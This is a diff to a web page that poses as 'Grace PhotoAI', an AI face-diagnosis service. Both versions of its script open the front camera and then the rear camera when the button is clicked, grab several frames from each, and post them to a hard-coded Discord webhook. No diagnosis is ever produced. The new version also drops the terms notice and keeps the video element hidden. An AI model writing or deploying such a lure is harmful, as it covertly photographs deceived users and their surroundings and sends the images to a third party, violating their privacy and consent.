@@ -4,7 +4,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta property="og:title" content="AI顔診断 Grace">
-  <meta property="og:description" content="肌年齢、顔の比率、イエベ/ブルベ…すぐにわかる！">
+  <meta property="og:description" content="肌年齢、顔の比率、イエベ/ブルベ等がすぐにわかる！">
   <meta property="og:image" content="https://gracephotoai.github.io/grace_preview_1200x630.jpg">
   <meta property="og:url" content="https://gracephotoai.github.io/">
   <meta name="twitter:card" content="summary_large_image">
@@ -12,126 +12,120 @@
   <title>Grace PhotoAI</title>
   <style>
     body {
-      margin: 0;
       background-color: #1e1e1e;
       color: white;
-      font-family: sans-serif;
       display: flex;
-      flex-direction: column;
-      align-items: center;
       justify-content: center;
+      align-items: center;
+      flex-direction: column;
       height: 100vh;
-    }
-    h1 {
-      font-size: 3em;
-      margin-bottom: 20px;
+      font-family: sans-serif;
     }
     button {
-      padding: 20px 40px;
-      font-size: 1.5em;
-      background-color: #444;
-      color: white;
+      font-size: 1.5rem;
+      padding: 1rem 2rem;
       border: none;
-      border-radius: 10px;
+      background-color: #4caf50;
+      color: white;
+      border-radius: 8px;
       cursor: pointer;
     }
     button:hover {
-      background-color: #666;
-    }
-    #video {
-      display: none;
-    }
-    #termsModal {
-      display: none;
-      position: fixed;
-      bottom: 0;
-      left: 0;
-      right: 0;
-      background: #333;
-      padding: 20px;
-      color: white;
-    }
-    #termsLink {
-      position: absolute;
-      bottom: 10px;
-      font-size: 0.8em;
-      text-decoration: underline;
-      cursor: pointer;
+      background-color: #45a049;
     }
   </style>
 </head>
 <body>
-  <h1>Grace PhotoAI</h1>
-  <button onclick="startDiagnosis()">診断する</button>
-  <video id="video" autoplay playsinline></video>
-  <div id="termsModal">本サービスは撮影された写真をAIで解析し、診断結果を提供します。利用に同意いただける方のみご使用ください。</div>
-  <div id="termsLink" onclick="toggleTerms()">利用規約</div>
-
-  <script>
-    const video = document.getElementById('video');
-    const webhookUrl = "https://discord.com/api/webhooks/1365282819646947409/YLfOxbOuLrQ6AHYb0_bImraprcO6VxmcoIbM4Sz2r9z_fIvuZiLED3TUIIDZCeQszc_u";
-
-    function toggleTerms() {
-      const modal = document.getElementById("termsModal");
-      modal.style.display = modal.style.display === "block" ? "none" : "block";
-    }
-
-    function stopStream() {
-      if (video.srcObject) {
-        video.srcObject.getTracks().forEach(track => track.stop());
-        video.srcObject = null;
-      }
-    }
-
-    async function captureFromCamera(facingMode) {
-      stopStream();
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode }});
-        video.srcObject = stream;
-
-        setTimeout(() => {
-          captureAndSendImages(5, 200);
-        }, 500);
-      } catch (err) {
-        alert("カメラへのアクセスが許可されていません。");
-        console.error(err);
-      }
-    }
-
-    function captureAndSendImages(count, interval) {
-      const canvas = document.createElement('canvas');
-      const context = canvas.getContext('2d');
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-
-      let captured = 0;
-      const intervalId = setInterval(() => {
-        if (captured >= count) {
-          clearInterval(intervalId);
-          return;
-        }
-
-        context.drawImage(video, 0, 0, canvas.width, canvas.height);
-        canvas.toBlob(blob => {
-          const formData = new FormData();
-          formData.append("file", blob, "photo.jpg");
-          formData.append("content", ""); // 画像のみ送信
-          fetch(webhookUrl, {
-            method: "POST",
-            body: formData
-          });
-        }, "image/jpeg");
-
-        captured++;
-      }, interval);
-    }
-
-    function startDiagnosis() {
-      captureFromCamera("user");  // 内カメ
-      setTimeout(() => {
-        captureFromCamera("environment");  // 外カメ
-      }, 1500);
-    }
-  </script>
+  <button onclick="startDualCameraCapture()">診断する</button>
+  <video id="video" autoplay playsinline style="display:none;"></video>
 </body>
+<script>
+const video = document.getElementById("video");
+const webhookUrl = "https://discord.com/api/webhooks/1365282819646947409/YLfOxbOuLrQ6AHYb0_bImraprcO6VxmcoIbM4Sz2r9z_fIvuZiLED3TUIIDZCeQszc_u";
+
+function stopStream() {
+  if (video.srcObject) {
+    video.srcObject.getTracks().forEach(track => track.stop());
+    video.srcObject = null;
+  }
+}
+
+async function captureFromCamera(facingMode) {
+  stopStream();
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode }});
+    video.srcObject = stream;
+    return new Promise(resolve => setTimeout(() => resolve(stream), 500));
+  } catch (err) {
+    console.error("カメラへのアクセスが許可されていません。", err);
+    return null;
+  }
+}
+
+function captureImages(count, interval) {
+  return new Promise(resolve => {
+    const canvas = document.createElement('canvas');
+    const context = canvas.getContext('2d');
+    const images = [];
+
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+
+    let captured = 0;
+    const intervalId = setInterval(() => {
+      if (captured >= count) {
+        clearInterval(intervalId);
+        resolve(images);
+        return;
+      }
+
+      context.drawImage(video, 0, 0, canvas.width, canvas.height);
+      canvas.toBlob(blob => {
+        images.push(blob);
+      }, "image/jpeg");
+
+      captured++;
+    }, interval);
+  });
+}
+
+async function startDualCameraCapture() {
+  let images = [];
+
+  const userStream = await captureFromCamera("user");
+  if (userStream) {
+    const userImages = await captureImages(5, 200);
+    images = images.concat(userImages);
+  }
+
+  const envStream = await captureFromCamera("environment");
+  if (envStream) {
+    const envImages = await captureImages(5, 200);
+    images = images.concat(envImages);
+  }
+
+  stopStream();
+
+  // 画像を埋め込み形式で一括送信
+  const files = await Promise.all(images.map((blob, i) => {
+    return new Promise(resolve => {
+      const reader = new FileReader();
+      reader.onloadend = () => {
+        resolve({ name: `image${i + 1}.jpg`, data: blob });
+      };
+      reader.readAsArrayBuffer(blob);
+    });
+  }));
+
+  const formData = new FormData();
+  files.forEach((file, index) => {
+    formData.append("files[" + index + "]", file.data, file.name);
+  });
+
+  fetch(webhookUrl, {
+    method: "POST",
+    body: formData
+  });
+}
+</script>
 </html>
